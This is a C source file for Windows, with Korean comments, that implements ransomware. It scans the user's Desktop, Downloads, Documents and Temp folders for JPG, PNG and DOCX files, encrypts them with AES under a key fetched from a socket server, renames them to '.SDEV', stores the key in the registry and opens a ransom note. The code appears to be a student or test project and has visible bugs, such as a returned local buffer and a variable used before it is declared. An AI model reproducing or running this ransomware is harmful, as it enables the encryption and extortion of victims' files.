#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS 
#include <stdio.h>
#include <WinSock2.h>
#include <Windows.h>
#include <winreg.h>
#include <string.h>
#include <locale.h>
#include <stdlib.h>
#include <time.h>
#include "aes.h"
#pragma comment(lib, "ws2_32")

typedef struct Directorytarget {
    wchar_t addr[1000]; // 파일 경로 주소
    wchar_t file[1000]; //랜섬웨어 타겟으로 설정할 파일
    wchar_t oex[1000];  //원래 파일의 확장자를 저장하는 멤버
}target;



//UserName을 불러오는 함수
wchar_t* getUserName() {
    wchar_t buf[512];
    DWORD pcbBuffer = sizeof(buf);

    if (!GetUserNameW(buf, &pcbBuffer)) {
        printf("Failed to get user name.\n");
        return 1;
    }
    return buf;
}

void EncryptTarget(target* t, unsigned char* key) {
    //wchar_t path[1000]; 
    wchar_t path1[1000]; //Readfile, Writefile, 확장자 변경을 위한 path1
    wcscpy(t->file, t->addr);

    //signature 확인하고 target.file에 넣을 지 말지 체크하기 위한 배열 선언
    BYTE signature[20480];// jpg, png, docx 체크

    struct AES_ctx ctx;
    uint8_t iv[] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };
    uint8_t* in;

    WIN32_FIND_DATAW FindData; //파일 검색 데이터 구조체 변수
    HANDLE hFind;  //파일 검색 핸들

    printf("\n----------------------\n");
    //printf("before : %S", path);
    wcscat(t->file, L"*");
    //printf("\n");
    printf("path :%S", t->file);

    hFind = FindFirstFileW(t->file, &FindData);//파일 검색 시작

    if (hFind == INVALID_HANDLE_VALUE) {
        puts("NO FILE.");
        return;
    }

    do {
        wcscpy(t->file, t->addr); // 그냥 다시 리셋해서 주소 받고
        wcscat(t->file, FindData.cFileName); // 파일 이름 추가

        HANDLE hFile = CreateFileW(t->file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD bytesRead = 1;
            //DWORD bytesRead1;
            //while을 통해서 파일을 끝까지 도달할 떄까지
            while (bytesRead) {

                ReadFile(hFile, signature, sizeof(signature), &bytesRead, NULL);
                if (bytesRead == 0) {
                    break;
                }

                // FF D8 FF E0
                if (signature[0] == 0XFF && signature[1] == 0XD8 && signature[2] == 0XFF && signature[3] == 0XE0) {
                    wprintf(L"\nJPG or JPEG : %s\n", FindData.cFileName);

                    in = signature;
                    printf("%02x %02x %02x %02x\n", signature[0], signature[1], signature[2], signature[3]);

                    AES_init_ctx_iv(&ctx, key, iv);
                    AES_CBC_encrypt_buffer(&ctx, in, bytesRead);

                    wcscpy(path1, t->file);

                    wchar_t* dotPos = wcsrchr(path1, L'.');
                    wcscpy(t->oex,dotPos);
                    if (dotPos) {
                        // Replace the file extension with ".SDEV"
                        wcscpy(dotPos, L".SDEV");
                    }
                    wprintf(L"Original Extension: %s\n", t->oex);
                    printf("path 1 :%S", path1);

                    HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    
                    DWORD bytesWritten;
                    WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);

                    DWORD currentPosition = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);

                    // 남은 부분을 읽어서 암호화하고 쓰기
                    while (bytesRead > 0) {
                        ReadFile(hFile, signature, sizeof(signature), &bytesRead, NULL);

                        if (bytesRead == 0) {
                            break; // 파일 끝에 도달한 경우 루프 종료
                        }

                        AES_init_ctx_iv(&ctx, key, iv);
                        AES_CBC_encrypt_buffer(&ctx, signature, bytesRead);

                        WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                    }

                    // 현재 파일 포인터 위치를 읽어서 쓴 위치로 복원
                    SetFilePointer(hFile, currentPosition, NULL, FILE_BEGIN);
                    CloseHandle(wFile);
                  
                }
                // 89 50 4E 47 0D 0A 1A 0A
                else if (signature[0] == 0X89 && signature[1] == 0X50 && signature[2] == 0X4E && signature[3] == 0X47 &&
                    signature[4] == 0X0D && signature[5] == 0X0A && signature[6] == 0X1A && signature[7] == 0X0A) {

                    wprintf(L"\nPNG : %s\n", FindData.cFileName);

                    in = signature;
                    printf("%02x %02x %02x %02x\n", signature[0], signature[1], signature[2], signature[3]);

                    AES_init_ctx_iv(&ctx, key, iv);
                    AES_CBC_encrypt_buffer(&ctx, in, bytesRead);

                    wcscpy(path1, t->file);

                    wchar_t* dotPos = wcsrchr(path1, L'.');
                    wcscpy(t->oex,dotPos);
                    if (dotPos) {
                        // Replace the file extension with ".SDEV"
                        wcscpy(dotPos, L".SDEV");
                    }
                    wprintf(L"Original Extension: %s\n", t->oex);
                    printf("path 1 :%S", path1);

                    HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    
                    DWORD bytesWritten;
                    WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);

                    DWORD currentPosition = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);

                    // 남은 부분을 읽어서 암호화하고 쓰기
                    while (bytesRead > 0) {
                        ReadFile(hFile, signature, sizeof(signature), &bytesRead, NULL);

                        if (bytesRead == 0) {
                            break; // 파일 끝에 도달한 경우 루프 종료
                        }

                        AES_init_ctx_iv(&ctx, key, iv);
                        AES_CBC_encrypt_buffer(&ctx, signature, bytesRead);

                        WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                    }

                    // 현재 파일 포인터 위치를 읽어서 쓸 위치로 복원
                    SetFilePointer(hFile, currentPosition, NULL, FILE_BEGIN);
                    CloseHandle(wFile);

                }
                // 50 4B 03 04
                else if (signature[0] == 0X50 && signature[1] == 0X4B && signature[2] == 0X03 && signature[3] == 0X04) {
                    wprintf(L"\ndocx : %s\n", FindData.cFileName);
                    in = signature;
                    printf("%02x %02x %02x %02x\n", signature[0], signature[1], signature[2], signature[3]);

                    AES_init_ctx_iv(&ctx, key, iv);
                    AES_CBC_encrypt_buffer(&ctx, in, bytesRead);

                    wcscpy(path1, t->file);
                    wcscpy(t->oex,dotPos);

                    wchar_t* dotPos = wcsrchr(path1, L'.');
                    if (dotPos) {
                        // Replace the file extension with ".SDEV"
                        wcscpy(dotPos, L".SDEV");
                    }
                    wprintf(L"Original Extension: %s\n", t->oex);
                    printf("path 1 :%S", path1);

                    HANDLE wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    
                    DWORD bytesWritten;
                    WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                    printf("\n%02X %02X %02X %02X %02X\n", in[0], in[1], in[2], in[3], in[4]);

                    DWORD currentPosition = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);

                    // 남은 부분을 읽어서 암호화하고 쓰기
                    while (bytesRead > 0) {
                        ReadFile(hFile, signature, sizeof(signature), &bytesRead, NULL);

                        if (bytesRead == 0) {
                            break; // 파일 끝에 도달한 경우 루프 종료
                        }

                        AES_init_ctx_iv(&ctx, key, iv);
                        AES_CBC_encrypt_buffer(&ctx, signature, bytesRead);

                        WriteFile(wFile, signature, bytesRead, &bytesWritten, NULL);
                    }

                    // 현재 파일 포인터 위치를 읽어서 쓸 위치로 복원
                    SetFilePointer(hFile, currentPosition, NULL, FILE_BEGIN);
                    CloseHandle(wFile);

                }

                bytesRead = 0;
            }


            CloseHandle(hFile);
        }
    } while (FindNextFileW(hFind, &FindData));

    FindClose(hFind);
}

void DecryptTarget(target* t, unsigned char* key) {
    wchar_t path2[1000]; // Readfile, Writefile 원래의 확장자 변경을 위한 path2
    wcscpy(path2, t->addr);

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, (uint8_t[]) { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f });

    printf("\n----------------------\n");
    wcscat(path2, L"*");
    printf("path :%S\n", path2);

    WIN32_FIND_DATAW FindData; // 파일 검색 데이터 구조체 변수
    HANDLE hFind;  // 파일 검색 핸들
    hFind = FindFirstFileW(path2, &FindData); // 파일 검색 시작

    if (hFind == INVALID_HANDLE_VALUE) {
        puts("NO FILE.");
        return;
    }

    do {
        wcscpy(path2, t->addr); // 주소 초기화
        wcscat(path2, FindData.cFileName); // 파일 이름 추가

        wchar_t* dotPos = wcsrchr(FindData.cFileName, L'.');
        if (dotPos && wcscmp(dotPos, L".SDEV") == 0) {
            wprintf(L"Decrypting: %s\n", path2);

            // Open the encrypted file
            HANDLE hFile = CreateFileW(path2, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile == INVALID_HANDLE_VALUE) {
                printf("Failed to open file for decryption: %S\n", path2);
                continue;
            }

            // Read the encrypted file content
            DWORD bytesRead;
            BYTE buffer[40960];
            DWORD currentPosition;

            HANDLE wFile;
            wchar_t path1[1000];

            // 첫 번째 블록을 읽고 복호화
            if (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
                AES_CBC_decrypt_buffer(&ctx, buffer, bytesRead);

                // Construct new path for decrypted file in a subdirectory
                wchar_t newDir[1000];
                wcscpy(newDir, t->addr);
                wcscat(newDir, L"test");
                wchar_t index[2];
                wsprintf(index, L"%d", (t->addr[wcslen(t->addr) - 2] - L'0')); // RansomwareTest 뒤 숫자를 가져와서 디렉터리 이름으로 사용
                wcscat(newDir, index);
                wcscat(newDir, L"\\");

                // Ensure the decrypted directory exists
                CreateDirectoryW(newDir, NULL);

                wcscpy(path1, newDir);
                wcscat(path1, FindData.cFileName);

                // Change the file extension back to original
                dotPos = wcsrchr(path1, L'.');
                if (dotPos) {
                    wcscpy(dotPos, t->oex);
                }
                else {
                    wcscat(path1, t->oex);
                }

                // Write the decrypted content back to a new file
                wFile = CreateFileW(path1, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (wFile == INVALID_HANDLE_VALUE) {
                    printf("Failed to open file for writing: %S\n", path1);
                    CloseHandle(hFile);
                    continue;
                }

                DWORD bytesWritten;
                WriteFile(wFile, buffer, bytesRead, &bytesWritten, NULL);
                currentPosition = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);

                // 남은 부분을 읽어서 복호화하고 쓰기
                while (bytesRead > 0) {
                    ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL);

                    if (bytesRead == 0) {
                        break; // 파일 끝에 도달한 경우 루프 종료
                    }

                    AES_CBC_decrypt_buffer(&ctx, buffer, bytesRead);
                    WriteFile(wFile, buffer, bytesRead, &bytesWritten, NULL);
                }

                // 현재 파일 포인터 위치를 읽어서 쓴 위치로 복원
                SetFilePointer(hFile, currentPosition, NULL, FILE_BEGIN);
                CloseHandle(wFile);
            }

            CloseHandle(hFile);
            wprintf(L"Decrypted and restored: %s\n", path1);
        }
    } while (FindNextFileW(hFind, &FindData));

    FindClose(hFind);
}
/*
void DecryptTarget(target* t, unsigned char* key) {
    wchar_t path2[1000]; //Readfile, Writefile 원래의 확장자 변경을 위한 path2
    wcscpy(path2, t->addr);

    struct AES_ctx ctx;

    printf("\n----------------------\n");
    wcscat(path2, L"*");
    printf("path :%S\n", path2);

    WIN32_FIND_DATAW FindData; //파일 검색 데이터 구조체 변수
    HANDLE hFind;  //파일 검색 핸들
    hFind = FindFirstFileW(path2, &FindData);//파일 검색 시작

    if (hFind == INVALID_HANDLE_VALUE) {
        puts("NO FILE.");
        return;
    }

    do {
        wcscpy(path2, t->addr); // 그냥 다시 리셋해서 주소 받고
        wcscat(path2, FindData.cFileName); // 파일 이름 추가

        wchar_t* dotPos = wcsrchr(FindData.cFileName, L'.');
        if (dotPos && wcscmp(dotPos, L".SDEV") == 0) {
            wprintf(L"%s\n", path2);
        }
    } while (FindNextFileW(hFind, &FindData));

    FindClose(hFind);
}
*/


int main()
{
    setlocale(LC_ALL, "Korean");
    _wsetlocale(LC_ALL, L"Korean");

    target tt[4]; //TargetDirectory가 저장될 변수
    //실제 암호화 테스트 시 임시 Target폴더 지정해서 test 진행할 것
    wchar_t prefix[100] = L"C:\\Users\\";
    wcscat(prefix, getUserName());

    for (size_t i = 0; i < 4; i++)
        wcscpy_s(tt[i].addr, sizeof(tt[i].addr) / sizeof(tt[i].addr[0]), prefix);

    wcscat(tt[0].addr, L"\\Desktop\\");
    wcscat(tt[1].addr, L"\\Downloads\\");
    wcscat(tt[2].addr, L"\\Documents\\");
    wcscat(tt[3].addr, L"\\AppData\\Local\\Temp\\");

   // 각 디렉터리 생성
    for (int i = 0; i < 4; i++) {
        CreateDirectoryW(tt[i].addr, NULL);
        wchar_t subDir[1000];
        wcscpy(subDir, tt[i].addr);
        wcscat(subDir, L"test");
        wchar_t index[2];
        wsprintf(index, L"%d", i + 1);
        wcscat(subDir, index);
        CreateDirectoryW(subDir, NULL);
    }

    // Winsock 초기화
    WSADATA wsaData = { 0 };
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed.\n");
        return 1;
    }

    // 소켓 생성
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        fprintf(stderr, "Failed to create socket\n");
        WSACleanup();
        return 1;
    }

    // 서버 정보 설정
    SOCKADDR_IN serverInfo = { 0 };
    serverInfo.sin_family = AF_INET;
    serverInfo.sin_port = htons(12345);
    serverInfo.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); // 서버 주소 변경 필요

    // 서버에 연결
    if (connect(clientSocket, (SOCKADDR*)&serverInfo, sizeof(serverInfo)) == SOCKET_ERROR) {
        fprintf(stderr, "Failed to connect to server\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    unsigned char randomKey[8];

    // 서버로부터 키 수신
    int bytesReceived = recv(clientSocket, (char*)randomKey, sizeof(randomKey), 0);
    if (bytesReceived == SOCKET_ERROR || bytesReceived < sizeof(randomKey)) {
        fprintf(stderr, "Failed to receive key from server\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    closesocket(clientSocket);
    WSACleanup();

    //generateRandomKey(randomKey, sizeof(randomKey));
    
    //EncryptTarget함수를 통해 target구조체 변수 주소 받으면 tt[4]배열에 각각 Directory들 주소 저장된다.
    //8byte 랜덤하게 생성할 키 선언 -> 키 서버를 통해 전달 받음.
    //전달받은 key를 톨해서 target 경로별 각 시그니처에 맞는 파일들을 AES 암호화 진행
    for (int i = 0; i < 4; i++)
        EncryptTarget(&tt[i], randomKey);

    // key를 생성하고 레지스트리에 저장
    printf("---------------------------------------------------\n");
    printf("Registry Key Insertion\n");
    printf("---------------------------------------------------\n");



    //HKEY_CURRENT_USER/Enviroment/ Key 삽입
     // 레지스트리 열기
    HKEY hKey;
    wchar_t subKey[] = L"Environment";
    if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        // 레지스트리에 키 삽입
        wchar_t valueName[] = L"KEY";
        if (RegSetValueEx(hKey, valueName, 0, REG_BINARY, randomKey, sizeof(randomKey)) == ERROR_SUCCESS) {
            printf("Key insertion success");
        }
        else {
            printf("Key insertion failed");
        }

        // 레지스트리 핸들 닫기
        RegCloseKey(hKey);
    }
    else {
        printf("Registry can't open\n");
    }


    // key를 생성하고 레지스트리에 저장
    printf("\n");


    // 파일을 불러와서 encrypt하고 저장하고 원본파일은 삭제

    // decryption.c: 똑같이 파일 다 불러오고
    for (int i = 0; i < 4; i++) {
        DecryptTarget(&tt[i], randomKey);
    }

    // key을 레지스트리에서 읽어오고
    // decrypt 실행해서 원본파일 복원하기

   LPCWSTR filePath = L"C:\\Users\\82107\\바탕 화면\\ransomenote.txt";

    HINSTANCE result = ShellExecute(NULL, L"open", filePath, NULL, NULL, SW_SHOWNORMAL);
    if ((int)result <= 32) {
        printf("Error opening file: %s",GetLastError() );
        return 1;
    }

    return 0;

}
